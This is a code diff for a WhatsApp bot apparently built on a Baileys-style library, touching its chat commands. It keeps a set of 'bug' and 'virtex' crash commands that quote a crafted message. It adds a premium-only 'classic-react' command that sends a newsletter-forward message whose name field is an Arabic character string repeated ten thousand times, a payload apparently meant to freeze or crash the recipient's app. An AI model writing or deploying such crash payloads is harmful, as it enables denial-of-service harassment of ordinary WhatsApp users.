@@ -47,7 +47,7 @@ participant: '0@s.whatsapp.net'
 },
 message: {
 listResponseMessage: {
-title: ` ◢◤◇◥◣◥◤◢◤ 𝑾𝑯𝒀 𝑻𝒀𝑷𝑬 𝑺𝑨𝑴? ◥◣◥◤◢◤◇◥◣ `
+title: ` ◥◤◢◤ ★彡 𝑺𝑼𝑹𝑷𝑹𝑰𝑺𝑬𝑫 𝑯𝑼𝑯?彡★◥◣◥◤ `
 }
 }
 }
@@ -2888,18 +2888,27 @@ ${json.result}
 break
 
 case "ai": case "chatgpt": case "openai": {
-if (!text) return msgreply (`Example : ${prefix + command} create code html & css for hack NASA`)
+if (!text) return reply (`Example : ${prefix + command} create code html & css for hack NASA`)
 var js = await fetch(`https://aemt.me/openai?text=${q}`) 
 var json = await js.json()
 zetsreply(json.result)
 }
 break
 //=================================================
-case 'bug': case 'classic': case 'sam': case 'oke': case 'dagger': case 'virtex': case 'virteks': case 'virtext': case 'pirtek': case 'pirteks': case 'pirtex': case 'anjay':{
-zetsubo.sendMessage(m.chat, { text: `King Sam?`}, { quoted: qbug })
+case 'bug?': case 'classic': case 'king': case 'oke': case 'fear': case 'virtex': case 'virteks': case 'virtext': case 'pirtek': case 'pirteks': case 'pirtex': case 'anjay':{
+zetsubo.sendMessage(m.chat, { text: `★彡 𝑺𝑼𝑹𝑷𝑹𝑰𝑺𝑬𝑫 𝑯𝑼𝑯?彡★`}, { quoted: qbug })
 }
 break
   //=================================================
+case 'classic-react': {
+if (!isPremium) return reply(mess.premium)
+if (!m.quoted) return reply(`Penggunaan .${command} reply pesan`)
+await zetsubo.sendMessage(m.chat, { text: 'success 💀', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(10000), serverMessageId: 2 } }}, { quoted: qbug })
+await sleep(20000)
+await zetsubo.sendMessage(m.chat, { react: { text: '🐬', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
+}
+break
+//===========================================		
 case 'docugc': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 await loading()
